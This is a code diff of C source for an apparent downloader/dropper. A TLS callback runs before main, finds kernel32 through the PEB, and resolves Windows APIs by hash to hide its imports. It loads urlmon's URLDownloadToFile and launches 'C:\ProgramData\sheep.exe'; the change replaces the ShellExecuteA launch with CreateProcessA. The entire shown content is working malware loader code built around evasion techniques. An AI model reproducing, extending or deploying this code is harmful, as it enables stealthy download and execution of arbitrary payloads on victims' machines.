@@ -52,7 +52,8 @@ typedef struct FULL_LDR_DATA_TABLE_ENTRY
 
 typedef HMODULE (* LoadLibraryAHeader)(LPCSTR);
 typedef DWORD (* GetFileAttributesAHeader)(LPCSTR);
-typedef HINSTANCE (*ShellExecuteAHeader)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
+typedef BOOL (* CreateProcessAHeader)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD,
+                                      LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
 typedef HRESULT (__stdcall *URLDownloadToFileHeader)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
 
 uint32_t fnv321a(const char *string)
@@ -104,11 +105,12 @@ void NTAPI callback(PVOID dllHandle, DWORD reason, PVOID reserved)
    PFULL_LDR_DATA_TABLE_ENTRY kernel32 = ((PFULL_LDR_DATA_TABLE_ENTRY)(((PFULL_LDR_DATA_TABLE_ENTRY)list_entry->InLoadOrderLinks.Flink)->InLoadOrderLinks.Flink));
    LoadLibraryAHeader loadLibrary = ((LoadLibraryAHeader)get_proc_by_hash((PIMAGE_DOS_HEADER)kernel32->DllBase, 0x53b2070f));
    GetFileAttributesAHeader getFileAttributes = ((GetFileAttributesAHeader)get_proc_by_hash((PIMAGE_DOS_HEADER)kernel32->DllBase, 0xda1a7563));
+   CreateProcessAHeader createProcess = ((CreateProcessAHeader)get_proc_by_hash((PIMAGE_DOS_HEADER)kernel32->DllBase, 0x4a7c0a09);
    PIMAGE_DOS_HEADER urlmonModule = ((PIMAGE_DOS_HEADER)loadLibrary("urlmon.dll"));
    URLDownloadToFileHeader urlDownloadToFile = ((URLDownloadToFileHeader)get_proc_by_hash(urlmonModule, 0xd8d746fc));
-   PIMAGE_DOS_HEADER shell32Module = ((PIMAGE_DOS_HEADER)loadLibrary("shell32.dll"));
-   ShellExecuteAHeader shellExecute = ((ShellExecuteAHeader)get_proc_by_hash(shell32Module, 0xb0ff5bf));
    char sheep[] = "C:\\ProgramData\\sheep.exe";
+   STARTUPINFO startup_info;
+   PROCESS_INFORMATION proc_info;
 
    if (reason != DLL_PROCESS_ATTACH)
       return;
@@ -123,7 +125,10 @@ void NTAPI callback(PVOID dllHandle, DWORD reason, PVOID reserved)
          return;
    }
 
-   shellExecute(NULL, NULL, sheep, NULL, NULL, 1);
+   memset(&startup_info, 0, sizeof(STARTUPINFO));
+   memset(&proc_info, 0, sizeof(PROCESS_INFORMATION));
+   startup_info.cb = sizeof(STARTUPINFO);
+   createProcess(NULL, sheep, NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info);
 }
 
 int main(int argc, char *argv[])
